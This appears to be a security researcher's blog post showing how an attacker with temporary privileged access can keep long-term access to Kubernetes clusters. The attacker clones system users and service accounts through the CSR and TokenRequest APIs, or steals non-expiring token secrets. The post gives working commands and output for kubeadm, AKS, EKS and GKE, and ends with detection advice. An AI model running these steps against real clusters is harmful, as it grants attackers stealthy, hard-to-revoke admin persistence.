---
layout: post
title: "Attack of the clones - Stealthy Kubernetes persistence with eathar, tòcan and teisteanas" 
date: 2022-12-21 19:27:00 +0100
comments: false
categories: Kubernetes
---

Follwing on from the [PCI Series](https://www.container-security.site/defenders/PCI_Container_Orchestration_Guidance.html) I thought it'd be nice to do a bit more of an attack focused piece for a change! 

I noticed that Microsoft have released a new version of the their [threat matrix for Kubernetes](https://www.microsoft.com/en-us/security/blog/2022/12/07/mitigate-threats-with-the-new-threat-matrix-for-kubernetes/), looking at the Persistence section, while they covered some of the usual suspects like static pods, there were some options that attackers can likely use to keep access to clusters that they didn't cover, around the use of Kubernetes APIs to use or create long-lived credentials which clone system accounts.

This kind of persistence technique would apply where the attacker has temporary access to relatively privileged credentials and wants to ensure that they retain access for the long term. this could be the case where an attacker has gained access to an administrator laptop, or where a disgruntled insider wants to retain access perhaps after they have left the organisation.

This kind of attack is made easier by the fact that the major managed Kubernetes distributions (GKE, EKS, AKS) all place the API server on the Internet by default. Whilst their hardening guides might mention removing it from the Internet, looking at the [current statistics](https://www.shodan.io/search/facet?query=product%3A%22Kubernetes%22&facet=org) from Shodan we can see plenty of Kubernetes hosts exposed to the Internet from the major cloud providers, and plenty of other hosts from smaller providers.

![Kubernetes on Shodan by Organization]({{site.url }}/assets/media/k8sproductshodan.png)

## Options for Persistent credentials.

There are effectively four ways, we can achieve the goal of having a long lasting set of privileged credentials for attacker persistence. 

The first option is to grab the cluster CA certificate and key which then lets us mint new credentials for any user in the cluster. This one notably only works with unmanaged clusters (so no running it on GKE, EKS or AKS). I've covered this one [before](https://raesene.github.io/blog/2019/04/16/kubernetes-certificate-auth-golden-key/), but it's worth mentioning again as it's a pretty easy way to get long lived credentials in the right kind of environment.

The second one is to use the Kubernetes CSR API to create new long-lived client certificates. Here we'll want to find a high privileged user in the cluster and effectively create a clone set of credentials for them. Kubernetes does not have a user database, so this is perfectly possible and the auditing tools won't be able to tell the difference between the original and the clone.

The third option is to use the TokenRequest API to create new long-lived service account token. As with the CSR option, we need to find a high privileged service account in the cluster and then create a clone set of credentials for it. 

The fourth one is the simplest and is mentioned in the threat matrix, which is that in older Kubernetes clusters (v1.23 and below) we can just access the service account token secrets associated with system accounts, grab the token and then we can use that to authenticate to the API server. Notably these secrets *do not expire* and the only way to revoke their access is to delete the associated service account. Where we're stealing the token of a core controller, that could be a bit of a tricky thing for the defender to fix. 

## Find a target user/service account to clone

Effectively all these techniques start from the same point which is finding an existing high privileged account which is part of the operational workflow of the cluster, so that we can retrieve an existing credential or create a set of clone credentials that we can use.

To do this we'll use [eathar](https://github.com/raesene/eathar) which is a Kubernetes security scanner and has some checks for privileged RBAC access.

We'll be using clusters setup with standard defaults with whatever the vendor currently offers. 

 - Kubeadm 1.25 (KinD)
 - AKS 1.24.6
 - EKS v1.23.13-eks-fb459a0
 - GKE v1.24.7-gke.900

### Kubeadm 1.25 Cluster

Starting with a vanilla Kubeadm 1.25 cluster, we can start by looking for wildcard users. These are users that have access to all resources in the cluster, and are effectively the same as having cluster admin access. 

```console
eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
```

This isn't actually really useful as the only subject is a Group, and we can't use that to create a clone set of credentials, we really need a user or service account. 

The next thing we can try is looking for users who have "get secrets" at the cluster level. These users can retrieve any secret from the cluster, which is pretty useful with older clusters as we can use it for retrieving any service account tokens (as well as anything else held as secrets)

```console
eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
```

This one shows some better options, notably the `system:kube-controller-manager` user, and the two service accounts. The `system:node` binding isn't useful as (unusually) there are no subjects!

Looking at the rights for `system:kube-controller-manager` we can see that not only does it have get secrets at the cluster level but also create on serviceaccounts/token which is useful for creating more credentials.

```console
kubectl auth can-i --list --as system:kube-controller-manager
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
endpoints                                       []                  [kube-controller-manager]   [get update]
leases.coordination.k8s.io                      []                  [kube-controller-manager]   [get update]
```

then looking at the rights for the two service accounts the persistent-volume-binder controller has some pretty useful rights including create pod and get secrets

```console
kubectl auth can-i --list --as system:serviceaccount:kube-system:persistent-volume-binder
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
```

### AKS 1.24.6

Let's take a look at how this would work in an AKS cluster. Let's start by looking for wildcard users.

```console
eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding aks-cluster-admin-binding
Subjects:
  Kind: User, Name: clusterAdmin
  Kind: User, Name: clusterUser
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
```

Well, that was easy :) There are two user accounts `clusterAdmin` and `clusterUser` which have full cluster admin access, so if we create a certificate for either of those we'll have full cluster admin access. If we want a service account to clone we can look for principals who have get secrets at the cluster level

```console
eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding aks-service-rolebinding
Subjects:
  Kind: User, Name: aks-support
RoleRef:
  Kind: ClusterRole, Name: aks-service, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding csi-azurefile-node-secret-binding
Subjects:
  Kind: ServiceAccount, Name: csi-azurefile-node-sa, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: csi-azurefile-node-secret-role, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:aks-client-nodes
Subjects:
  Kind: Group, Name: system:nodes
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:azure-cloud-provider-secret-getter
Subjects:
  Kind: ServiceAccount, Name: azure-cloud-provider, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:azure-cloud-provider-secret-getter, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:persistent-volume-binding
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:persistent-volume-secret-operator, APIGroup: rbac.authorization.k8s.io
------------------------
```

We can see plenty of options to clone there, including the two we saw in Kubeadm.

### EKS v1.23.13-eks-fb459a0

First up looking for wildcard users.

```console
 eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding eks:addon-cluster-admin
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
```

We see that there's a user account `eks:addon-manager` which has full cluster admin access. Looking at for principals with the rights to get secrets we get the following:

```console
eathar rbac getsecretsusers
Findings for the Users with access to secrets check
ClusterRoleBinding eks:addon-manager
Subjects:
  Kind: User, Name: eks:addon-manager
RoleRef:
  Kind: ClusterRole, Name: eks:addon-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
```

For service accounts we've got the same ones as we had with Kubeadm and AKS.

### GKE v1.24.7-gke.900

Looking at GKE for wildcard users, we can see the following:

```console
eathar rbac wildcardusers
Findings for the Users with wildcard access to all resources check
ClusterRoleBinding cluster-admin
Subjects:
  Kind: Group, Name: system:masters
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding storage-version-migration-migrator-v2
Subjects:
  Kind: User, Name: system:storageversionmigrator
RoleRef:
  Kind: ClusterRole, Name: cluster-admin, APIGroup: rbac.authorization.k8s.io
```

So we've got a nice user with cluster-admin access to use for client certificates. Looking for users with get secrets access we get the following:

```console
ClusterRoleBinding kubelet-cluster-admin
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:expand-controller
Subjects:
  Kind: ServiceAccount, Name: expand-controller, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:expand-controller, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:controller:persistent-volume-binder
Subjects:
  Kind: ServiceAccount, Name: persistent-volume-binder, Namespace: kube-system
RoleRef:
  Kind: ClusterRole, Name: system:controller:persistent-volume-binder, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:glbc-status
Subjects:
  Kind: User, Name: system:controller:glbc
  Kind: User, Name: system:l7-lb-controller
RoleRef:
  Kind: ClusterRole, Name: system:glbc-status, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:kube-controller-manager
Subjects:
  Kind: User, Name: system:kube-controller-manager
RoleRef:
  Kind: ClusterRole, Name: system:kube-controller-manager, APIGroup: rbac.authorization.k8s.io
------------------------
ClusterRoleBinding system:node
Subjects:
RoleRef:
  Kind: ClusterRole, Name: system:node, APIGroup: rbac.authorization.k8s.io
------------------------
```

So we've got our usual `persistent-volume-binder` service account and some other options as well.


## Creating a cloned user account using Teisteanas

Now we've got our list of users and service accounts we can clone, we can use [Teisteanas](https://github.com/raesene/teisteanas) to create Kubeconfigs which use client certificate authentication for users. You can do these steps manually, but Teisteanas makes it easy to do this quickly.

### Kubeadm 1.25

Here we'll create a clone for our `system:kube-controller-manager` user account. 

```console
teisteanas -username system:kube-controller-manager
Certificate Successfully issued to username system:kube-controller-manager in group none , signed by kubernetes, valid until 2023-12-22 10:27:09 +0000 UTC
```

From this we can see it succeeded in creating the kubeconfig and the expiry is 12 months, which is the default. We can now use this kubeconfig to authenticate to the cluster.

```console
kubectl --kubeconfig system\:kube-controller-manager.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names              Verbs
secrets                                         []                  []                          [create delete get update]
serviceaccounts                                 []                  []                          [create get update]
events                                          []                  []                          [create patch update]
events.events.k8s.io                            []                  []                          [create patch update]
endpoints                                       []                  []                          [create]
serviceaccounts/token                           []                  []                          [create]
tokenreviews.authentication.k8s.io              []                  []                          [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                          [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                          [create]
subjectaccessreviews.authorization.k8s.io       []                  []                          [create]
leases.coordination.k8s.io                      []                  []                          [create]
```

We can see we've got plenty of rights. We can also use this kubeconfig to authenticate to the cluster and use it to create a new service accounts if we wanted to.

### AKS 1.24.6

With AKS, the obvious target is the `clusterAdmin` user account. 

```console
teisteanas -username clusterAdmin
Certificate Successfully issued to username clusterAdmin in group none , signed by ca, valid until 2023-12-22 10:29:41 +0000 UTC
```

Again we get a one year lifetime on our credential. 

```console
kubectl --kubeconfig clusterAdmin.config auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
```

Checking the rights, we get that delightful `*.*` which means we have full cluster admin access.

### EKS v1.23.13-eks-fb459a0

Trying our client certificate generation technique on EKS, we get the following:

```console
teisteanas -username eks:addon-manager
2022/12/22 16:15:42 Error issuing cert, are you trying this with EKS?
```

This is because EKS has effectively disabled the CSR API for certificates that can authenticate to the Kubernetes API server. This isn't officially in their documentation (that I can find) but there's a [Github issue](https://github.com/aws/containers-roadmap/issues/1604) which confirms this.

### GKE v1.24.7-gke.900

For GKE we're going to use our `system:storageversionmigrator` user account.

```console
teisteanas -username system:storageversionmigrator
Certificate Successfully issued to username system:storageversionmigrator in group none , signed by e3d7d8ea-bc41-4e34-a0d4-e7b7fdbbc66b, valid until 2027-12-21 18:02:26 +0000 UTC
```

There's an interesting difference here, which is that the certificate is valid for **5 years** by default, which is a nice level of persistence!

Checking the access we can confirm we have cluster-admin

```console
ubectl --kubeconfig system\:storageversionmigrator.config auth can-i --list
Warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                        Non-Resource URLs   Resource Names   Verbs
*.*                                              []                  []               [*]
                                                 [*]                 []               [*]
```
So that works pretty well, as it did with AKS and Kubeadm.

## Cloning service account credentials with tòcan

If we want to create an credential based on a service account, we can do that using the TokenRequest API. [Tòcan](https://github.com/raesene/tocan) is a tool which just wraps the API and automates creating the Kubeconfig file.

### Kubeadm 1.25

For Kubeadm we'll create a token for the `persistent-volume-binder` service account in the `kube-system` namespace, and look to create the token for 1 year.

```console
tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
```

We can then check the rights with kubectl to confirm it worked ok

```console
kubectl --kubeconfig persistent-volume-binder.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
persistentvolumes                               []                                    []               [create delete get list update watch]
pods                                            []                                    []               [create delete get list watch]
endpoints                                       []                                    []               [create delete get update]
services                                        []                                    []               [create delete get]
events.events.k8s.io                            []                                    []               [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
persistentvolumeclaims                          []                                    []               [get list update watch]
storageclasses.storage.k8s.io                   []                                    []               [get list watch]
nodes                                           []                                    []               [get list]
secrets                                         []                                    []               [get]
persistentvolumeclaims/status                   []                                    []               [update]
persistentvolumes/status                        []                                    []               [update]
events                                          []                                    []               [watch create patch update]
```

We can also check the expiration of the token. Probably the easiest way to do this is just paste the token into [jwt.io](https://jwt.io/)

![jwt token issued for the persistent volume binder service account]({{site.url }}/assets/media/pvbjwt.png)

From this the `exp` value of `1703242042` can be decoded to show that the token expires on Friday, 22 December 2023 10:47:22.

### AKS 1.24.6

For AKS we can use the same service account as it was one of the ones returned in our `eathar` checks for access to secrets at the cluster level, and this works the same way, including the 1 year expiration, which works fine.

### EKS v1.23.13-eks-fb459a0

For EKS we can again create a token for the same service account and it will issue ok. However looking at the `exp` field of the token we can see it's only valid for 24 hours, a far cry from the 1 year we were expecting. It appears that AWS have decided to limit the maximum duration of issued tokens. So whilst this technique works, it'd be quite a bit more noisy as it would require daily refreshes.

### GKE v1.24.7-gke.900

for GKE we can use the same service account again as it was one of the ones returned with our `eathar` checks.

```
tocan -service-account persistent-volume-binder -namespace kube-system -expiration-seconds 31536000
W1222 18:04:58.428287   96628 warnings.go:70] requested expiration of 31536000 seconds shortened to 172800 seconds
Kubeconfig file persistent-volume-binder.kubeconfig created for service account persistent-volume-binder in namespace kube-system
```

Interestingly we get a warning and GKE has done something similar to EKS in that it's limited the maximum duration of issued tokens, this time to two days. So again, whilst this technique works, it'd be quite a bit more noisy as it would require refreshes every other day.

## Stealing secrets from existing service accounts

As mentioned this one only works in older clusters as the Kubernetes project have been working to reduce the use of non-expiring service account secrets. Where we do find a cluster, we don't need any new tooling to create our Kubeconfig file as there's a [krew](https://krew.sigs.k8s.io/) plugin called [view-serviceaccount-kubeconfig](https://github.com/superbrothers/kubectl-view-serviceaccount-kubeconfig-plugin) which we can use.

### Kubeadm 1.25

Checking for secrets in `kube-system` we can see that they're not there (as expected)

```console
kubectl get secrets -n kube-system
NAME                     TYPE                            DATA   AGE
bootstrap-token-abcdef   bootstrap.kubernetes.io/token   6      6h33m
```

so if we try to create a kubeconfig file we get an error

```console
kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system
Error: serviceaccount persistent-volume-binder has no secrets
```

### AKS 1.24.6

This technique doesn't work in AKS as there are no secrets for service accounts in 1.24

### EKS v1.23.13-eks-fb459a0

The default EKS cluster that we got created is running 1.23, so this technique still works

```console
kubectl view-serviceaccount-kubeconfig persistent-volume-binder -n kube-system > persistent-volume-binder-secret.kubeconfig
```
We can then test the kubeconfig file to make sure it works

```console
 kubectl --kubeconfig persistent-volume-binder-secret.kubeconfig auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names     Verbs
persistentvolumes                               []                                    []                 [create delete get list update watch]
pods                                            []                                    []                 [create delete get list watch]
endpoints                                       []                                    []                 [create delete get update]
services                                        []                                    []                 [create delete get]
events.events.k8s.io                            []                                    []                 [create patch update]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
persistentvolumeclaims                          []                                    []                 [get list update watch]
storageclasses.storage.k8s.io                   []                                    []                 [get list watch]
nodes                                           []                                    []                 [get list]
```

Decoding the token we see something interesting about the old secrets based tokens, which is... no `exp` parameter, as they don't expire!

![jwt token issued for the persistent volume binder service account]({{site.url }}/assets/media/pvbsecrettoken.png)

### GKE v1.24.7-gke.900

This technique doesn't work in GKE as there are no secrets for service accounts in 1.24

## Preventing and detecting these attacks

If you're on the cluster operator side of things, how would you prevent or detect these attacks? Both service account tokens and client certificates are part of core Kubernetes and can't be disabled. Client certificate can't be revoked and revoking service account tokens requires deleting the attached service account, which is tricky if what's been cloned is a core service account.

I could give the standard security answer of "just make sure people don't have access to those APIs" but that's probably not very practical in reality for a lot of clusters.

Keeping the API server off the Internet would definitely help as it makes it harder for the attacker to use their cloned credentials.

In terms of detecting this, the obvious suggestion is Kubernetes audit logging. First, make sure you have it enabled! Then look at any access to the CSR API and the TokenRequest API. Finding the attacker using their cloned accounts is tricky as the audit service doesn't denote anything about the credential used, so you can't tell the difference between a legitimate service account use and an attacker's cloned service account token, for example.

## Conclusion

There's a couple of interesting points in this (for me). First up is the difference in how well the techniques work in different cluster types. EKS appears to have the most restrictive setup and has reduced the efficacy of these attacks quite a bit, although it's current version still allows for the older secret based attack. AKS and GKE both allow the attacks to work, although GKE does mitigate the new service account token attacks by limiting the maximum duration of issued tokens.

Here's a matrix of our attacks and how they work in the different clusters we tested.

![Attack matrix]({{site.url }}/assets/media/attackmatrix.png)

